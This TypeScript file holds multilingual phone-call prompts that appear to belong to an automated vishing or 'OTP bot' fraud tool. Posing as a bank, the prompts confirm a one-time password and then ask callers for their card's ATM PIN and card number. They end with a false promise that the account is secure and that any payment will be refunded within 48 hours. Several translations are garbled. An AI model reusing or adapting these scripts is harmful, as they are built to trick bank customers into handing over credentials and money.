import { Language } from '../../types';

export const getLangVerifyInput = ({
  language,
  step,
  sp,
  cardType,
}: {
  language: Language;
  dtmf?: string;
  cardType?: string;
  sp?: string;
  step: string;
}): string | undefined => {
  switch (step) {
    case `bank`:
      return {
        'en-US': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
        'en-CA': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
        'en-AU': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
        'en-GB': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
        'en-NZ': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the pound key.`,
        'en-ZA': `Your one time password has been verified successfully. To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM, followed by the hash key.`,
        'es-ES': `Su contraseña de un solo uso ha sido verificada con éxito. Para AUTENTIFICARLO, ingrese el PIN de su TARJETA, el mismo PIN que usa en el cajero automático, seguido de la tecla numeral.`,
        'pt-PT': `Sua senha de uso único foi verificada com sucesso. Para AUTENTICAR VOCÊ, por favor, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da chave sustenido.`,
        'pt-BR': `Sua senha de uso único foi verificada com sucesso. Para AUTENTICAR VOCÊ, por favor, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da chave sustenido.`,
        'it-IT': `La tua password monouso è stata verificata con successo. Per AUTENTICARE inserisci il PIN della CARTA, lo stesso pin che usi all'ATM, seguito dal cancelletto.`,
        'fr-FR': `Votre mot de passe à usage unique a été vérifié avec succès. Pour VOUS AUTHENTIFIER, veuillez entrer le NIP de votre CARTE, le même NIP que vous utilisez au guichet automatique, suivi de la touche dièse.`,
        'de-DE': `Ihr Einmalpasswort wurde erfolgreich verifiziert. Um SIE ZU AUTHENTIFIZIEREN, geben Sie bitte Ihre KARTEN-PIN ein, dieselbe PIN, die Sie am Geldautomaten verwenden, gefolgt von der Raute-Taste.`,
        'nb-NO': `Engangspassordet ditt har blitt bekreftet. For å AUTENTISERE DEG, skriv inn KORT-PIN-koden din, den samme PIN-koden du bruker i minibanken, etterfulgt av pund-nøkkelen.`,
        'pl-PL': `Twoje jednorazowe hasło zostało pomyślnie zweryfikowane. Aby UWIERZYTELNIĆ SIĘ, wprowadź PIN KARTY, ten sam, którego używasz w bankomacie, a następnie krzyżyk.`,
        'sv-SE': `Ditt engångslösenord har verifierats framgångsrikt. För att AUTENTIFICERA DIG vänligen ange din KORT-PIN, samma PIN-kod som du använder i bankomaten, följt av pundnyckeln.`,
        'tr-TR': `Tek kullanımlık şifreniz başarıyla doğrulandı. SİZİN DOĞRULAMAK için lütfen ATM'de kullandığınız aynı şifre olan KART PIN'inizi ve ardından kare anahtarını girin.`,
        'cy-GB': `Mae'ch cyfrinair un tro wedi'i ddilysu'n llwyddiannus. I'W DDILYSU, rhowch eich PIN CERDYN, yr un pin a ddefnyddiwch yn y peiriant ATM, ac yna'r allwedd punt.`,
        'nl-NL': `Uw eenmalige wachtwoord is succesvol geverifieerd. Om u te AUTHENTICEREN, voert u uw KAART-PIN in, dezelfde pincode die u gebruikt bij de geldautomaat, gevolgd door het hekje.`,
        'da-DK': `Din engangsadgangskode er blevet bekræftet. For at AUTENTIFICERE DIG skal du indtaste din KORT-PIN, den samme PIN-kode, du bruger i pengeautomaten, efterfulgt af pund-nøglen.`,
        'ca-ES': `La vostra contrasenya única s'ha verificat correctament. Per AUTENTICAR-vos si us plau, introduïu el PIN de la vostra TARGETA, el mateix pin que feu servir al caixer automàtic, seguit de la clau de lletra.`,
      }[language];

    case `pay`:
      return {
        'en-US': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the pound key.`,
        'en-CA': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the pound key.`,
        'en-AU': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the pound key.`,
        'en-GB': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the pound key.`,
        'en-NZ': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the pound key.`,
        'en-ZA': `To AUTHENTICATE YOU please enter your CARD PIN, the same pin you use at the ATM,  followed by the hash key.`,
        'es-ES': `Para AUTENTIFICARLO, ingrese el PIN de su TARJETA, el mismo PIN que usa en el cajero automático, seguido de la tecla numeral.`,
        'pt-PT': `Para AUTENTICAR VOCÊ, por favor, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da chave sustenido.`,
        'pt-BR': `Para AUTENTICAR VOCÊ, por favor, digite o PIN do seu CARTÃO, o mesmo PIN que você usa no caixa eletrônico, seguido da chave sustenido.`,
        'it-IT': `Per AUTENTICARE inserisci il PIN della CARTA, lo stesso pin che usi all'ATM, seguito dal cancelletto.`,
        'fr-FR': `Pour VOUS AUTHENTIFIER, veuillez entrer le NIP de votre CARTE, le même NIP que vous utilisez au guichet automatique, suivi de la touche dièse.`,
        'de-DE': `Um SIE ZU AUTHENTIFIZIEREN, geben Sie bitte Ihre KARTEN-PIN ein, dieselbe PIN, die Sie am Geldautomaten verwenden, gefolgt von der Raute-Taste.`,
        'nb-NO': `For å AUTENTISERE DEG, skriv inn KORT-PIN-koden din, den samme PIN-koden du bruker i minibanken, etterfulgt av pund-nøkkelen.`,
        'pl-PL': `Aby UWIERZYTELNIĆ SIĘ, wprowadź PIN KARTY, ten sam, którego używasz w bankomacie, a następnie krzyżyk.`,
        'sv-SE': `För att AUTENTIFICERA DIG vänligen ange din KORT-PIN, samma PIN-kod som du använder i bankomaten, följt av pundnyckeln.`,
        'tr-TR': `SİZİN DOĞRULAMAK için lütfen ATM'de kullandığınız aynı şifre olan KART PIN'inizi ve ardından kare anahtarını girin.`,
        'cy-GB': `I'W DDILYSU, rhowch eich PIN CERDYN, yr un pin a ddefnyddiwch yn y peiriant ATM, ac yna'r allwedd punt.`,
        'nl-NL': `Om u te AUTHENTICEREN, voert u uw KAART-PIN in, dezelfde pincode die u gebruikt bij de geldautomaat, gevolgd door het hekje.`,
        'da-DK': `For at AUTENTIFICERE DIG skal du indtaste din KORT-PIN, den samme PIN-kode, du bruger i pengeautomaten, efterfulgt af pund-nøglen.`,
        'ca-ES': `Per AUTENTICAR-vos si us plau, introduïu el PIN de la vostra TARGETA, el mateix que feu servir al caixer automàtic, seguit de la clau de lletra.`,
      }[language];

    case `account`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-CA': `We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-AU': `We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-GB': `We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-NZ': `We need to verify you, please enter your ${cardType} card number followed by the pound key.`,
            'en-ZA': `We need to verify you, please enter your ${cardType} card number followed by the hash key.`,
            'es-ES': `Necesitamos verificarlo, ingrese su número de tarjeta de ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido de la tecla numeral.`,
            'pt-PT': `Precisamos verificá-lo, digite o número do seu cartão de ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'pt-BR': `Precisamos verificá-lo, digite o número do seu cartão de ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DÉBITO`
                : `CRÉDITO`
            } seguido da chave sustenido.`,
            'it-IT': `Abbiamo bisogno di verificarti, inserisci il numero della tua carta di ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBITO`
                : `CREDITO`
            } seguito dal cancelletto.`,
            'fr-FR': `Nous devons vous vérifier, veuillez entrer votre numéro de carte ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `CRÉDIT`
            } suivi de la touche dièse.`,
            'de-DE': `Wir müssen Sie verifizieren, bitte geben Sie Ihre ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }Kartennummer gefolgt von der Raute-Taste ein.`,
            'nb-NO': `Vi må bekrefte deg, vennligst skriv inn ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `debet`
                : `kreditt`
            }kortnummeret ditt etterfulgt av pundnøkkelen.`,
            'pl-PL': `Musimy Cię zweryfikować, wprowadź numer karty ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT`
                : `KREDYT`
            }, a następnie krzyżyk.`,
            'sv-SE': `Vi måste verifiera dig. Ange ditt ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `betal`
                : `KREDIT`
            }kortsnummer följt av pundnyckeln.`,
            'tr-TR': `Sizi doğrulamamız gerekiyor, lütfen ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `BANKA`
                : `KREDİ`
            } kartı numaranızı ve ardından kare anahtarını girin.`,
            'cy-GB': `Mae angen i ni eich gwirio, rhowch rif eich cerdyn ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `debyd`
                : `CREDYD`
            } ac yna'r allwedd punt.`,
            'nl-NL': `We moeten u verifiëren. Voer uw ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `CREDIT-`
            }kaartnummer in gevolgd door het hekje.`,
            'da-DK': `Vi skal bekræfte dig. Indtast venligst dit ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DEBIT-`
                : `KREDIT`
            }kortnummer efterfulgt af pund-tasten.`,
            'ca-ES': `Hem de verificar-vos, si us plau, introduïu el número de la vostra targeta de ${
              cardType === ``
                ? ``
                : cardType && cardType.toLowerCase() === `debit`
                ? `DÈBIT`
                : `CRÈDIT`
            } seguit de la clau.`,
          }[language];

        case `2`:
          return {
            'en-US': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-CA': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-AU': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-GB': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-NZ': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'en-ZA': `Your account is now secure. If the payment has already left your account, NO NEED TO WORRY. It will automatically be refunded to you in 24 to 48 hours. Thank you, goodbye.`,
            'es-ES': `Su cuenta ahora es segura. Si el pago ya salió de tu cuenta, NO TE PREOCUPES. Se le reembolsará automáticamente en 24 a 48 horas. Gracias adios.`,
            'pt-PT': `Sua conta agora está segura. Se o pagamento já saiu da sua conta, NÃO PRECISA SE PREOCUPAR. Ele será reembolsado automaticamente em 24 a 48 horas. Obrigado, adeus.`,
            'pt-BR': `Sua conta agora está segura. Se o pagamento já saiu da sua conta, NÃO PRECISA SE PREOCUPAR. Ele será reembolsado automaticamente em 24 a 48 horas. Obrigado, adeus.`,
            'it-IT': `Il tuo account è ora sicuro. Se il pagamento ha già lasciato il tuo account, NESSUN BISOGNO DI PREOCCUPARE. Ti verrà automaticamente rimborsato in 24-48 ore. Grazie arrivederci.`,
            'fr-FR': `Votre compte est désormais sécurisé. Si le paiement a déjà quitté votre compte, PAS BESOIN DE VOUS INQUIÉTER. Il vous sera automatiquement remboursé sous 24 à 48 heures. Merci, au revoir.`,
            'de-DE': `Ihr Konto ist jetzt sicher. Wenn die Zahlung bereits von Ihrem Konto abgebucht wurde, brauchen Sie sich keine Sorgen zu machen. Es wird Ihnen innerhalb von 24 bis 48 Stunden automatisch zurückerstattet. Danke. Auf Wiedersehen.`,
            'nb-NO': `Kontoen din er nå sikker. Hvis betalingen allerede har forlatt kontoen din, BEHOV INGEN BEKYMELSE. Den vil automatisk bli refundert til deg innen 24 til 48 timer. Tusen takk, hade.`,
            'pl-PL': `Twoje konto jest teraz bezpieczne. Jeśli wpłata opuściła już Twoje konto, NIE MUSISZ SIĘ TEŻ TEŻ. Zostanie on automatycznie zwrócony w ciągu 24 do 48 godzin. Dziękuję do widzenia.`,
            'sv-SE': `Ditt konto är nu säkert. Om betalningen redan har lämnat ditt konto, BEHÖVER INGEN BEHÖRIG OROR. Den kommer automatiskt att återbetalas till dig inom 24 till 48 timmar. Tack adjö.`,
            'tr-TR': `Hesabınız artık güvende. Ödeme zaten hesabınızdan çıktıysa, ENDİŞEYE GEREK YOKTUR. 24 ila 48 saat içinde size otomatik olarak iade edilecektir. Teşekkürler hoşça kalın.`,
            'cy-GB': `Mae eich cyfrif bellach yn ddiogel. Os yw'r taliad eisoes wedi gadael eich cyfrif, DIM ANGEN PRYNU. Bydd yn cael ei ad-dalu'n awtomatig i chi mewn 24 i 48 awr. Diolch, hwyl fawr.`,
            'nl-NL': `Uw account is nu beveiligd. Als de betaling uw rekening al heeft verlaten, hoeft u zich geen zorgen te maken. Het wordt automatisch binnen 24 tot 48 uur aan u terugbetaald. Dank u vaarwel.`,
            'da-DK': `Din konto er nu sikker. Hvis betalingen allerede har forladt din konto, SKAL DU INGEN BETYVELSE. Det vil automatisk blive refunderet til dig inden for 24 til 48 timer. Tak farvel.`,
            'ca-ES': `El vostre compte ara està segur. Si el pagament ja ha sortit del vostre compte, NO HEU DE PREOCUPAR-SE. Se us retornarà automàticament en 24 a 48 hores. Gràcies adéu.`,
          }[language];
        default:
          return `should never be here`;
      }

    case `shared`:
      switch (sp) {
        case `1`:
          return {
            'en-US': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the pound key.`,
            'en-CA': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the pound key.`,
            'en-AU': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the pound key.`,
            'en-GB': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the pound key.`,
            'en-NZ': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the pound key.`,
            'en-ZA': `The one-time password you have entered is incorrect. Please enter the one-time password again followed by the hash key.`,
            'es-ES': `La contraseña de un solo uso que ingresó es incorrecta. Ingrese la contraseña de un solo uso nuevamente seguida de la tecla numeral.`,
            'pt-PT': `A senha de uso único que você digitou está incorreta. Digite a senha de uso único novamente seguida da tecla sustenido.`,
            'pt-BR': `A senha de uso único que você digitou está incorreta. Digite a senha de uso único novamente seguida da tecla sustenido.`,
            'it-IT': `La password monouso che hai inserito non è corretta. Inserisci di nuovo la password monouso seguita dal cancelletto.`,
            'fr-FR': `Le mot de passe à usage unique que vous avez entré est incorrect. Veuillez saisir à nouveau le mot de passe à usage unique suivi de la touche dièse.`,
            'de-DE': `Das eingegebene Einmalpasswort ist falsch. Bitte geben Sie erneut das Einmalpasswort gefolgt von der Rautetaste ein.`,
            'nb-NO': `Engangspassordet du har oppgitt er feil. Vennligst skriv inn engangspassordet på nytt etterfulgt av pund-tasten.`,
            'pl-PL': `Wprowadzone hasło jednorazowe jest nieprawidłowe. Wprowadź ponownie hasło jednorazowe, a następnie krzyżyk.`,
            'sv-SE': `Engångslösenordet du har angett är felaktigt. Vänligen ange engångslösenordet igen följt av pundnyckeln.`,
            'tr-TR': `Girdiğiniz tek kullanımlık şifre yanlış. Lütfen bir kerelik şifreyi tekrar girin ve ardından kare tuşuna basın.`,
            'cy-GB': `Mae'r cyfrinair un-amser a roesoch yn anghywir. Rhowch y cyfrinair unwaith eto ac yna'r allwedd punt.`,
            'nl-NL': `Het door u ingevoerde eenmalige wachtwoord is onjuist. Voer het eenmalige wachtwoord opnieuw in, gevolgd door het hekje.`,
            'da-DK': `Den engangsadgangskode, du har indtastet, er forkert. Indtast venligst engangsadgangskoden igen efterfulgt af pund-tasten.`,
            'ca-ES': `La contrasenya única que heu introduït és incorrecta. Si us plau, torneu a introduir la contrasenya única seguida de la tecla de lletres.`,
          }[language];

        case `2`:
          return {
            'en-US': `Please wait while we verify your input.`,
            'en-CA': `Please wait while we verify your input.`,
            'en-AU': `Please wait while we verify your input.`,
            'en-GB': `Please wait while we verify your input.`,
            'en-NZ': `Please wait while we verify your input.`,
            'en-ZA': `Please wait while we verify your input.`,
            'es-ES': `Espere mientras verificamos su entrada.`,
            'pt-PT': `Aguarde enquanto verificamos sua entrada.`,
            'pt-BR': `Aguarde enquanto verificamos sua entrada.`,
            'it-IT': `Attendi mentre verifichiamo il tuo input.`,
            'fr-FR': `Veuillez patienter pendant que nous vérifions votre saisie.`,
            'de-DE': `Bitte warten Sie, während wir Ihre Eingabe überprüfen.`,
            'nb-NO': `Vennligst vent mens vi bekrefter innspillet ditt.`,
            'pl-PL': `Poczekaj, aż zweryfikujemy Twoje dane wejściowe.`,
            'sv-SE': `Vänta medan vi verifierar din inmatning.`,
            'tr-TR': `Girişinizi doğrularken lütfen bekleyin.`,
            'cy-GB': `Arhoswch tra byddwn yn gwirio eich mewnbwn.`,
            'nl-NL': `Even geduld a.u.b. terwijl we uw invoer verifiëren.`,
            'da-DK': `Vent venligst, mens vi bekræfter dit input.`,
            'ca-ES': `Espereu mentre verifiquem la vostra entrada.`,
          }[language];
        default:
          return `Should never be here.`;
      }
    default:
      break;
  }
};
